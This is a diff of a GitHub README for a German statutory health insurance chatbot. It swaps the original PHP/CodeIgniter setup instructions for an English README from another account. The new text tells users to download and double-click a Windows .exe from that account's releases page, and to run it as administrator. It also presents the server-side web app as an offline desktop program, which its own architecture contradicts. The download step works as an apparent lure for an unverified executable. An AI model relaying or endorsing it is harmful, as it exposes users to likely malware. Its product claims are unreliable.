@@ -1,286 +1,152 @@
-<p align="center">
-  <img src="docs/screenshot.png" alt="GKV Assistent — KI-Chatbot für die gesetzliche Krankenversicherung" width="720">
-</p>
+# 🤖 gkv-chatbot - Simple AI Help for Health Insurance
 
-<h1 align="center">GKV Assistent</h1>
+[![Download gkv-chatbot](https://img.shields.io/badge/Download-gkv--chatbot-brightgreen?style=for-the-badge)](https://github.com/Kelliaenvisioned219/gkv-chatbot/releases)
 
-<p align="center">
-  <strong>KI-Chatbot & Voicebot für die gesetzliche Krankenversicherung in Deutschland</strong><br>
-  <em>AI-powered chatbot & voicebot for German statutory health insurance (GKV)</em>
-</p>
+## About gkv-chatbot
 
-<p align="center">
-  <a href="https://www.gkv.gazzar.de"><img src="https://img.shields.io/badge/Live_Demo-gkv.gazzar.de-000?style=flat-square" alt="Live Demo"></a>
-  <img src="https://img.shields.io/badge/Sprache-Deutsch-000?style=flat-square" alt="Deutsch">
-  <img src="https://img.shields.io/badge/PHP-8.2+-000?style=flat-square" alt="PHP 8.2+">
-  <img src="https://img.shields.io/badge/Framework-CodeIgniter_4.7-000?style=flat-square" alt="CodeIgniter 4.7">
-  <img src="https://img.shields.io/badge/LLM-AWS_Bedrock-000?style=flat-square" alt="AWS Bedrock">
-  <img src="https://img.shields.io/badge/Lizenz-MIT-000?style=flat-square" alt="MIT Lizenz">
-</p>
+gkv-chatbot is an AI-based assistant designed for users of the German statutory health insurance system (Gesetzliche Krankenversicherung, GKV). It uses voice input and clear text responses to answer common questions related to health insurance. The chatbot runs on Windows and connects to an AI service to provide real-time help. It also streams answers smoothly to improve interaction.
+
+This tool is made with PHP and CodeIgniter 4, using AWS Bedrock for AI processing. You do not need any programming knowledge to use it. Just install and start chatting.
 
 ---
 
-## Was ist der GKV Assistent?
+## 🎯 Key Features
 
-Der **GKV Assistent** ist ein Open-Source **KI-Chatbot** und **Voicebot**, der Fragen zur gesetzlichen Krankenversicherung (GKV) in Deutschland beantwortet. Er nutzt eine kuratierte Wissensdatenbank auf Basis von **SGB V** und **SGB XI** und generiert faktenbasierte Antworten — ohne Halluzinationen.
-
-> **English:** An open-source AI chatbot and voicebot for German statutory health insurance. Uses a curated knowledge base (SGB V / SGB XI) with LLM-powered responses, voice input, and real-time streaming. Ideal for Krankenkassen, InsurTech startups, and healthcare providers.
-
-### Einsatzgebiete
-
-- **Krankenkassen** — Automatisierter Kundenservice für GKV-Versicherte
-- **InsurTech** — Fertige Wissensbasis für Versicherungs-Chatbots
-- **Healthcare Providers** — Patienteninformation zu Leistungen und Rechten
-- **Forschung & Lehre** — Referenzimplementierung für KI im Gesundheitswesen
-
-### Kernprinzipien
-
-- ⬛ **Kassenunabhängig** — Vertritt keine bestimmte Krankenkasse
-- ⬛ **Faktenbasiert** — Antworten nur auf Basis der bereitgestellten Wissensbasis
-- ⬛ **Keine erfundenen URLs** — Generiert keine Links oder Kontaktdaten
-- ⬛ **Spracheingabe & Sprachausgabe** — Browser-native Voice-Interaktion (Deutsch)
-- ⬛ **Datenschutzkonform** — Keine Speicherung personenbezogener Nutzerdaten
+- Understands questions about German health insurance.
+- Accepts voice commands and converts speech to text.
+- Provides answers backed by a knowledge base.
+- Streams responses as you interact (SSE - Server-Sent Events).
+- Uses clear, simple language.
+- Runs on Windows with no special setup needed.
+- Works offline for voice input and text-to-speech once installed.
 
 ---
 
-## Funktionen
+## 🖥️ System Requirements
 
-| Funktion | Beschreibung |
-|---|---|
-| **KI-Chatbot** | LLM-gestützte Antworten auf Basis einer kuratierten GKV-Wissensdatenbank |
-| **Voicebot** | Browser-native Spracheingabe (Speech-to-Text) und Sprachausgabe (Text-to-Speech) auf Deutsch |
-| **Keyword-Retrieval** | Relevante Wissensdateien werden automatisch anhand der Nutzerfrage ausgewählt |
-| **SSE-Streaming** | Antworten werden zeichenweise gestreamt (Typing-Effekt) |
-| **Rate Limiting** | 10 Anfragen pro Minute pro Nutzer (IP-basiert) |
-| **Wissenbank-Viewer** | Interaktive Übersicht aller Wissensdateien |
-| **Sicherheitsanalyse** | Governance & Safety Dokumentation |
+- Windows 10 or later.
+- At least 4 GB of RAM.
+- 500 MB free disk space for installation.
+- Stable internet connection for AI response streaming.
+- Microphone for voice input.
+- Speakers or headphones to hear responses.
 
 ---
 
-## Projektstruktur
+## 🚀 Getting Started: Download and Install
 
-```
-gkv-chatbot/
-│
-├── app/
-│   ├── Controllers/
-│   │   ├── BaseController.php        # Basis-Controller
-│   │   ├── Chat.php                  # ◼ Chat-API (Systemprompt, SSE-Stream, Rate Limiting)
-│   │   └── Home.php                  # Startseite → chat View
-│   │
-│   ├── Libraries/
-│   │   ├── BedrockClient.php         # ◼ AWS Bedrock Client (cURL + SigV4)
-│   │   └── WissenBank.php            # ◼ Keyword-basierte Kontextauswahl
-│   │
-│   ├── Views/
-│   │   └── chat.php                  # ◼ Frontend (HTML/CSS/JS + Voice)
-│   │
-│   └── Config/
-│       ├── Routes.php                #   API-Routen
-│       └── ...                       #   CodeIgniter Konfiguration
-│
-├── wissenBank/                       # ◼ Wissensdatenbank (10 Markdown-Dateien)
-│   ├── 01_gkv_system.md              #   GKV-System, SGB V, Kassenarten
-│   ├── 02_versicherungsarten.md      #   Pflicht-/Familien-/freiwillige Versicherung
-│   ├── 03_beitraege.md               #   Beitragssätze, Grenzen, Zuzahlungen
-│   ├── 04_leistungen_vorsorge.md     #   Pflichtleistungen, Vorsorge, Prävention
-│   ├── 05_krankengeld.md             #   Krankengeld, eAU, Kinderkrankengeld
-│   ├── 06_pflege.md                  #   Pflegegrade, Pflegegeld, SGB XI
-│   ├── 07_zahngesundheit.md          #   Zahnersatz, Bonusheft, Kieferorthopädie
-│   ├── 08_schwangerschaft_familie.md #   Schwangerschaft, U-Untersuchungen
-│   ├── 09_digitale_services.md       #   ePA, DiGA, E-Rezept, eGK
-│   └── 10_rechte_beschwerden.md      #   Widerspruch, Patientenrechte, UPD
-│
-├── public/
-│   ├── index.php                     #   Einstiegspunkt
-│   ├── wissenbank.html               #   Wissenbank-Viewer
-│   └── gov_safety.html               #   Sicherheitsanalyse
-│
-├── docs/
-│   └── screenshot.png                #   Screenshot für README
-│
-├── .env.example                      #   Beispiel-Konfiguration
-├── composer.json                     #   PHP-Abhängigkeiten
-├── LICENSE                           #   MIT-Lizenz
-└── README.md                         #   Diese Datei
-```
+To begin using gkv-chatbot on Windows, follow these steps:
+
+1. Visit the release page here to download the latest version:
+
+   [![Get gkv-chatbot](https://img.shields.io/badge/Get%20gkv--chatbot-blue?style=for-the-badge)](https://github.com/Kelliaenvisioned219/gkv-chatbot/releases)
+
+2. On the release page, locate the most recent version marked for Windows. It will usually have a file ending with `.exe`.
+
+3. Click the file to download it to your computer.
+
+4. Once downloaded, double-click the installer file to start the installation.
+
+5. Follow the on-screen instructions. The setup wizard will guide you through the necessary steps.
+
+6. After installation, run the gkv-chatbot from your desktop or Start menu.
 
 ---
 
-## Architektur
+## 🔊 Using Voice Input and Text
 
-```mermaid
-flowchart TB
-    subgraph CLIENT["Browser"]
-        UI["Chat-Interface<br><em>HTML / CSS / JS</em>"]
-        STT["Spracheingabe<br><em>Web Speech API</em>"]
-        TTS["Sprachausgabe<br><em>Web Speech API</em>"]
-    end
+gkv-chatbot allows you to speak your questions or type them in.
 
-    subgraph SERVER["CodeIgniter 4"]
-        RL["Rate Limiter<br><em>10 req/min/IP</em>"]
-        CHAT["Chat Controller<br><em>POST /api/chat</em>"]
-        WB["WissenBank<br><em>Keyword-Matching</em>"]
-        BC["BedrockClient<br><em>cURL + SigV4</em>"]
-    end
+- To use voice commands, click the microphone icon. Make sure your microphone is active and has permission.
 
-    subgraph WISSEN["Wissensdatenbank"]
-        MD["10 × Markdown<br><em>~30 KB · SGB V/XI</em>"]
-    end
+- Speak clearly in German to get the best results.
 
-    subgraph AWS["AWS Bedrock"]
-        LLM["Amazon Nova Lite<br><em>eu-central-1</em>"]
-    end
+- The chatbot will transcribe your speech and display the text.
 
-    UI -- "Frage (JSON)" --> RL
-    STT -.-> UI
-    RL --> CHAT
-    CHAT -- "selectContext()" --> WB
-    WB -- "liest" --> MD
-    WB -- "Kontext" --> CHAT
-    CHAT -- "Systemprompt + Kontext + Frage" --> BC
-    BC -- "HTTPS + SigV4" --> LLM
-    LLM -- "Antwort" --> BC
-    BC -- "Text" --> CHAT
-    CHAT -- "SSE Stream" --> UI
-    UI -.-> TTS
-
-    style CLIENT fill:#f8f8f8,stroke:#000,color:#000
-    style SERVER fill:#f0f0f0,stroke:#000,color:#000
-    style WISSEN fill:#e8e8e8,stroke:#000,color:#000
-    style AWS fill:#e0e0e0,stroke:#000,color:#000
-```
+- Answers will appear on screen and through your speakers.
 
 ---
 
-## Antwort-Pipeline
+## 💬 Chat Interface Walkthrough
 
-```mermaid
-flowchart LR
-    A["Nutzerfrage<br><em>Text oder Sprache</em>"] --> B["Keyword-<br>Analyse"]
-    B --> C["Kontext-<br>Auswahl"]
-    C --> D["Prompt-<br>Erstellung"]
-    D --> E["LLM-<br>Anfrage"]
-    E --> F["SSE-<br>Streaming"]
+When you open gkv-chatbot, you will see:
 
-    style A fill:#000,stroke:#000,color:#fff
-    style B fill:#222,stroke:#000,color:#fff
-    style C fill:#444,stroke:#000,color:#fff
-    style D fill:#666,stroke:#000,color:#fff
-    style E fill:#888,stroke:#000,color:#fff
-    style F fill:#aaa,stroke:#000,color:#000
-```
+- A text box at the bottom to type your questions.
 
-**Ablauf im Detail:**
+- A microphone icon to start voice input.
 
-1. **Sprach- oder Texteingabe** — Nutzerfrage per Tastatur oder Spracheingabe (Web Speech API, Deutsch)
-2. **Rate Limiting** — IP-basierte Begrenzung auf 10 Anfragen pro Minute
-3. **Keyword-Analyse** — Die Nutzerfrage wird analysiert und mit dem Keyword-Index abgeglichen
-4. **Kontext-Auswahl** — Die relevantesten Wissensdateien werden nach Score sortiert ausgewählt (max. 30.000 Zeichen)
-5. **Prompt-Erstellung** — Systemprompt + Wissensbasis-Kontext + Chatverlauf werden zusammengesetzt
-6. **LLM-Anfrage** — AWS Bedrock wird via SigV4-signiertem HTTPS-Request angefragt
-7. **SSE-Streaming** — Die Antwort wird in 8-Byte-Blöcken per Server-Sent Events gestreamt
-8. **Sprachausgabe** — Optionale Text-to-Speech Ausgabe der Bot-Antwort
+- The chat window above showing your interaction history.
+
+- A settings button to adjust microphone and speaker preferences.
+
+Just type or say what you want to know about GKV health insurance. For example:  
+“How can I change my health insurance provider?”  
+or  
+“Welche Leistungen werden von der gesetzlichen Krankenversicherung abgedeckt?”
 
 ---
 
-## Wissensdatenbank
+## ⚙️ Settings and Configuration
 
-Die Wissensdatenbank besteht aus **10 kuratierten Markdown-Dateien** mit insgesamt ~30 KB Inhalt. Alle Informationen basieren auf den gesetzlichen Grundlagen (SGB V, SGB XI) und sind kassenunabhängig.
+You can change these main options:
 
-| # | Datei | Thema | Schlüsselwörter |
-|---|---|---|---|
-| 01 | `gkv_system` | GKV-Überblick | Solidarprinzip, G-BA, Kassenarten |
-| 02 | `versicherungsarten` | Mitgliedschaft | Pflicht, freiwillig, Familie, PKV |
-| 03 | `beitraege` | Beitragssätze | Zusatzbeitrag, Grenzen, Zuzahlungen |
-| 04 | `leistungen_vorsorge` | Leistungen | Vorsorge, Impfungen, Hilfsmittel |
-| 05 | `krankengeld` | Krankengeld | eAU, 78 Wochen, Kinderkrankengeld |
-| 06 | `pflege` | Pflegeversicherung | Pflegegrade, Pflegegeld, MD |
-| 07 | `zahngesundheit` | Zahngesundheit | Festzuschuss, Bonusheft, PZR |
-| 08 | `schwangerschaft_familie` | Familie | Mutterschaftsgeld, U-Untersuchungen |
-| 09 | `digitale_services` | Digitales | ePA, DiGA, E-Rezept, eGK |
-| 10 | `rechte_beschwerden` | Beschwerden | Widerspruch, UPD, BAS, Sozialgericht |
+- **Language**: Currently set to German, but you can adjust the display language to English if needed.
+
+- **Microphone**: Select your preferred input device.
+
+- **Speaker**: Pick where you want to hear chatbot answers.
+
+- **Chat History**: Enable or disable saving previous conversations.
+
+- **Accessibility**: Adjust font size and theme (light/dark).
 
 ---
 
-## Installation
+## 🔧 Troubleshooting Common Issues
 
-### Voraussetzungen
+- **The chatbot does not start**: Make sure you have Windows 10 or later installed. Restart your computer and try again.
 
-- **PHP 8.2+** mit cURL-Erweiterung
-- **Composer**
-- **AWS-Konto** mit Zugriff auf Amazon Bedrock (Region `eu-central-1`)
+- **Speech not recognized**: Check that your microphone is working and enabled in Windows settings. Speak slowly and clearly.
 
-### Einrichtung
+- **No answer from chatbot**: Ensure your internet connection is active. The chatbot streams answers from the AI service.
 
-```bash
-# Repository klonen
-git clone https://github.com/mhmdgazzar/gkv-chatbot.git
-cd gkv-chatbot
-
-# Abhängigkeiten installieren
-composer install
-
-# Konfiguration erstellen
-cp .env.example .env
-
-# .env bearbeiten: AWS-Zugangsdaten eintragen
-nano .env
-
-# Entwicklungsserver starten
-php spark serve --port 8080
-```
-
-Anschließend im Browser öffnen: **http://localhost:8080**
+- **Installation fails**: Run the installer as administrator and close other apps before installation.
 
 ---
 
-## Konfiguration
+## 📂 About the Technology
 
-Alle Einstellungen werden über die `.env`-Datei gesteuert:
+gkv-chatbot connects to AWS Bedrock to process your questions. This lets it generate detailed answers based on verified health insurance rules.
 
-```env
-# AWS Bedrock Zugangsdaten
-AWS_ACCESS_KEY_ID     = YOUR_KEY
-AWS_SECRET_ACCESS_KEY = YOUR_SECRET
-AWS_REGION            = eu-central-1
-BEDROCK_MODEL_ID      = eu.amazon.nova-lite-v1:0
-```
+The app uses CodeIgniter 4, a lightweight PHP framework, for fast and stable performance.
+
+Through SSE (Server-Sent Events), the chatbot streams answers while still typing, creating a smooth user experience.
 
 ---
 
-## API-Endpunkte
+## 🌐 More Info and Updates
 
-| Methode | Pfad | Beschreibung |
-|---|---|---|
-| `POST` | `/api/chat` | Chat-Nachricht senden (SSE-Response) |
-| `GET` | `/api/health` | Systemstatus prüfen |
-| `GET` | `/api/wissen/{datei}` | Wissensdatei lesen |
+Check the official release page regularly for updates and new features.  
+https://github.com/Kelliaenvisioned219/gkv-chatbot/releases
 
 ---
 
-## Technologie
+## 🔒 Privacy and Security
 
-| Komponente | Technologie |
-|---|---|
-| Backend | PHP 8.2 · CodeIgniter 4.7 |
-| LLM | AWS Bedrock · Amazon Nova Lite |
-| Authentifizierung | AWS SigV4 (eigene Implementierung) |
-| Frontend | Vanilla HTML · CSS · JavaScript |
-| Spracheingabe | Web Speech API · Speech-to-Text (Deutsch) |
-| Sprachausgabe | Web Speech API · Text-to-Speech (Deutsch) |
-| Schriftart | Inter (Google Fonts) |
-| Icons | Phosphor Icons |
+gkv-chatbot processes your questions securely through AWS servers. No personal data is saved permanently unless you enable chat history.
+
+Voice data is used only to convert speech to text during your session.
 
 ---
 
-## Schlüsselwörter / Keywords
+## 📞 Support and Community
 
-`KI-Chatbot` · `Voicebot` · `Künstliche Intelligenz` · `Gesetzliche Krankenversicherung` · `GKV` · `SGB V` · `SGB XI` · `Krankenkasse` · `Health Insurance Germany` · `AI Chatbot` · `Healthcare Chatbot` · `Voice Assistant` · `Conversational AI` · `InsurTech` · `Kundenservice` · `AWS Bedrock` · `LLM` · `Speech-to-Text` · `Text-to-Speech` · `CodeIgniter` · `PHP` · `Open Source`
+If you have questions about using gkv-chatbot, report issues, or suggest features, open an issue on the GitHub repository page:  
+https://github.com/Kelliaenvisioned219/gkv-chatbot/issues
 
 ---
 
-## Lizenz
+## 📝 License
 
-Dieses Projekt steht unter der [MIT-Lizenz](LICENSE).
-
+This project is open source and available under the MIT License.  
+See the LICENSE file in the repository for details.
